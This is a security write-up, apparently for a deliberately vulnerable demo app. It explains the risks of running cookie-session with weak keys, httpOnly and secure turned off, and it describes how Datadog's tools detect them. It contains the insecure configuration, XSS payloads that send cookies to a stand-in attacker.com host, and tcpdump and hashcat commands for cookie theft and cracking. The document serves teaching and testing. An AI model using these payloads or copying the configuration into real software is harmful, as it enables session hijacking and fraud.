# Cookie-Session Vulnerability

## Overview

This application uses `cookie-session` instead of `express-session`, which introduces multiple security vulnerabilities by storing session data in **client-side cookies** rather than server-side storage.

## What Changed

### Before (More Secure)
```javascript
const session = require('express-session');

app.use(session({
  secret: 'secret-key',
  resave: false,
  saveUninitialized: false,
  store: new SessionStore(), // Server-side storage
  cookie: {
    httpOnly: true,
    secure: true
  }
}));
```

### After (Less Secure - Current Implementation)
```javascript
const session = require('cookie-session');

app.use(session({
  name: 'session',
  keys: ['insecure-secret', 'backup-key'],
  maxAge: 24 * 60 * 60 * 1000,
  secure: false,     // VULNERABILITY
  httpOnly: false,   // VULNERABILITY
  signed: true
}));
```

## Security Vulnerabilities

### 1. Client-Side Session Storage
**Issue**: Session data is stored entirely in cookies sent to the client

**Risk**:
- Users can view all session data in browser dev tools
- Session data can be modified if signature is cracked
- Sensitive information exposed to client

**Example Attack**:
```javascript
// User opens browser console and can see:
document.cookie // Shows all session data including user info
```

### 2. Session Data Tampering
**Issue**: If the weak secret key is compromised, attackers can forge sessions

**Risk**:
- Privilege escalation (change `isAdmin: false` to `isAdmin: true`)
- User impersonation (change `userId`)
- Price manipulation (modify cart prices)

**Example Attack**:
```javascript
// Attacker cracks weak secret 'insecure-secret'
// Decodes cookie, modifies: {"userId": 1, "isAdmin": false}
// Changes to: {"userId": 1, "isAdmin": true}
// Re-signs with cracked secret and sets new cookie
```

### 3. XSS-Accessible Cookies (httpOnly: false)
**Issue**: JavaScript can access session cookies

**Risk**:
- XSS attacks can steal session cookies
- Malicious scripts can read user session data
- Session hijacking via XSS

**Example Attack**:
```javascript
// Attacker injects XSS payload:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
// Session cookie stolen and sent to attacker
```

### 4. HTTP Transmission (secure: false)
**Issue**: Cookies sent over unencrypted HTTP connections

**Risk**:
- Man-in-the-Middle (MITM) attacks
- Session sniffing on public WiFi
- Cookie theft via network interception

**Example Attack**:
```bash
# Attacker on same network intercepts HTTP traffic
tcpdump -i wlan0 -A | grep "Cookie:"
# Captures session cookie in plaintext
```

### 5. Size Limitations
**Issue**: Cookies have 4KB limit per domain

**Risk**:
- Session data truncation
- Application errors with large sessions
- Data loss

**Example**:
```javascript
// Adding too much to session causes issues
req.session.largeData = hugeObject; // Might fail or truncate
```

### 6. No Server-Side Invalidation
**Issue**: Can't invalidate sessions from server

**Risk**:
- Can't force logout on compromise
- Sessions remain valid until expiry
- No way to revoke access

**Example**:
```javascript
// Admin wants to terminate user session
// With express-session: sessionStore.destroy(sessionId)
// With cookie-session: Can't force client to delete cookie
```

## Exploitation Scenarios

### Scenario 1: Admin Privilege Escalation

1. **Attacker registers normal account**
   - Session cookie: `{"userId": 10, "isAdmin": false}`

2. **View cookie in browser console**
   ```javascript
   document.cookie // Shows base64 encoded session
   ```

3. **Decode cookie** (it's just base64 + signature)
   ```bash
   echo "encoded_value" | base64 -d
   ```

4. **Crack weak secret** (brute force or dictionary attack)
   ```bash
   hashcat -m 1450 session_signature wordlist.txt
   ```

5. **Forge new session**
   ```javascript
   // Change: {"userId": 10, "isAdmin": false}
   // To: {"userId": 10, "isAdmin": true}
   // Re-sign with cracked secret
   ```

6. **Access admin panel**
   - Now has admin privileges

### Scenario 2: Price Manipulation

1. **Add item to cart**
   - Session: `{"cart": [{"id": 1, "price": 15.99}]}`

2. **Intercept and modify cookie**
   ```javascript
   // Change price from 15.99 to 0.01
   {"cart": [{"id": 1, "price": 0.01}]}
   ```

3. **Checkout with modified price**
   - Pays $0.01 instead of $15.99

### Scenario 3: Session Hijacking via XSS

1. **Attacker finds XSS vulnerability**
   ```javascript
   // Injects malicious script
   <script src="https://attacker.com/steal.js"></script>
   ```

2. **Script steals session cookie**
   ```javascript
   // steal.js
   fetch('https://attacker.com/log', {
     method: 'POST',
     body: document.cookie // httpOnly: false allows this
   });
   ```

3. **Attacker uses stolen session**
   - Sets cookie in their browser
   - Impersonates victim

## Detection in Datadog

### IAST (Interactive Application Security Testing)
Datadog IAST should detect:
- **Insecure cookie configuration** (httpOnly: false, secure: false)
- **Weak session management**
- **Session fixation vulnerabilities**

### ASM (Application Security Management)
Will detect exploitation attempts:
- Cookie tampering attempts
- XSS attacks targeting cookies
- Session hijacking attempts

### Code Security
Static analysis may flag:
- Use of `cookie-session` with weak configuration
- Missing security flags on cookies

## Proper Mitigation (Not Implemented Here)

### Use express-session with Server-Side Storage
```javascript
const session = require('express-session');
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Strong, random secret
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,      // HTTPS only
    httpOnly: true,    // Not accessible via JavaScript
    sameSite: 'strict', // CSRF protection
    maxAge: 1800000    // 30 minutes
  }
}));
```

### Benefits of Proper Implementation
- ✅ Session data stored server-side (Redis, database)
- ✅ Only session ID in cookie (opaque token)
- ✅ Can invalidate sessions from server
- ✅ httpOnly prevents XSS theft
- ✅ secure prevents MITM
- ✅ No size limitations
- ✅ Can implement rate limiting

## Testing the Vulnerability

### View Session Data
```javascript
// Open browser console on the application
console.log(document.cookie);
// You can see the base64 encoded session data
```

### Decode Session
```javascript
// Get the session cookie value
const cookieValue = document.cookie
  .split('; ')
  .find(row => row.startsWith('session='))
  .split('=')[1];

// Decode (requires understanding of cookie-session format)
console.log(atob(cookieValue.split('.')[0]));
```

### Modify and Test
```javascript
// Manually set a modified cookie
document.cookie = "session=modified_value; path=/";
// Reload page and see if modification is accepted
```

## Why This is in the Application

This vulnerability is intentionally included to demonstrate:
1. Client-side session storage risks
2. Cookie security best practices
3. Datadog IAST detection capabilities
4. Session management vulnerabilities

## OWASP References

- **A02:2021 – Cryptographic Failures**: Weak session management
- **A04:2021 – Insecure Design**: Client-side data storage
- **A05:2021 – Security Misconfiguration**: Insecure cookie settings
- **A07:2021 – Identification and Authentication Failures**: Weak session handling

## Compliance Impact

### PCI DSS
- **Requirement 6.5.10**: Broken authentication and session management
- **Failure**: Storing sensitive data in client-side cookies

### GDPR
- **Article 32**: Security of processing
- **Issue**: Inadequate protection of personal data in sessions

### OWASP ASVS
- **V3: Session Management**: Multiple failures
  - V3.2: Cookie-based session tokens
  - V3.3: Insufficient session timeout
  - V3.6: httpOnly and secure flags

## Summary

The switch from `express-session` to `cookie-session` with insecure configuration creates multiple attack vectors:

| Vulnerability | Impact | CVSS Score |
|--------------|--------|------------|
| Client-side storage | Data exposure | 5.3 (Medium) |
| Session tampering | Privilege escalation | 8.1 (High) |
| XSS-accessible cookies | Session hijacking | 7.5 (High) |
| HTTP transmission | MITM attacks | 6.5 (Medium) |
| No server invalidation | Persistent access | 5.3 (Medium) |

**Overall Risk**: HIGH

This makes the application excellent for security testing, training, and demonstrating Datadog's security monitoring capabilities.
